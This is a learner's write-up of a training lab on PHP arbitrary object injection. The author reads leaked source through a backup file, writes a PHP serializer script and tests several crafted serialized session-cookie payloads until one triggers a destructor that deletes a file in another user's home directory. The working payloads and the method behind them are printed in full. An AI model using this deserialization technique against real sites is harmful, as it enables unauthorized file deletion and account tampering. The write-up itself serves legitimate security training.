# Practitioner Lab 100: Arbitrary object injection in PHP

---

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: `wiener:peter`

By appending the ~ to the end of the file I was able to read code that the website had to look at the source code.

![Untitled](Practitioner%20Lab%20100%20Arbitrary%20object%20injection%20in%20cb6d376283aa4497af4a7172df9a5e23/Untitled.png)

After looking at the code 
• **`function __destruct()`**: This is the destructor of the class. It is called when the object is destroyed. If the lock file exists, it deletes the lock file. This is where the file deletion happens.

this means that this might be used to destroy the file.

```
<?php

class CustomTemplate {
    public $template_file_path;
    public $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }
}

// Create a new CustomTemplate object
$template = new CustomTemplate("morale.txt");

// Serialize the CustomTemplate object
$serialized_template = serialize($template);

// Output the serialized CustomTemplate object
echo $serialized_template;

?>

```

Using this php code I was able to inject the object

```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"kxr51em3r6rdih4nsx6sxv46dbrs4c1s";}|O:14:"CustomTemplate":2:{s:18:"template_file_path";s:10:"morale.txt";s:14:"lock_file_path";s:15:"morale.txt.lock";
```

i tried to combine both cookies but this did not work.

Now my thought process is to try and match that cookie by using the number 0 with the == operator.

Since this did not work I then decided to tried to change into carlos account by performing some idor as well as changing the cookies username

This resulted in an error which showed me a valid token. 

![Untitled](Practitioner%20Lab%20100%20Arbitrary%20object%20injection%20in%20cb6d376283aa4497af4a7172df9a5e23/Untitled%201.png)

I decided to copy this token into the cookie to see what it would do. 

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"a8l3o6kng6f4imh5cxzmc61i7l36qdmz";}|O:14:"CustomTemplate":2:{s:18:"template_file_path";s:10:"morale.txt";s:14:"lock_file_path";s:15:"morale.txt.lock";
```

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"users/carlos/morale.txt";s:14:"lock_file_path";s:28:"users/carlos/morale.txt.lock";
```

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:10:"morale.txt";s:14:"lock_file_path";s:15:"morale.txt.lock";}
```

This one was wrong because I thought I needed to add the .lock at the end but after looking at the code I noticed that I only needed to add the normal filepath and that the function would add the .lock and this worked.

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:10:"morale.txt";s:14:"lock_file_path";s:10:"morale.txt";}
```

This final payload worked at the end and solved the lab.

![Untitled](Practitioner%20Lab%20100%20Arbitrary%20object%20injection%20in%20cb6d376283aa4497af4a7172df9a5e23/Untitled%202.png)

The lab payload was 

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

This is also a valid solution.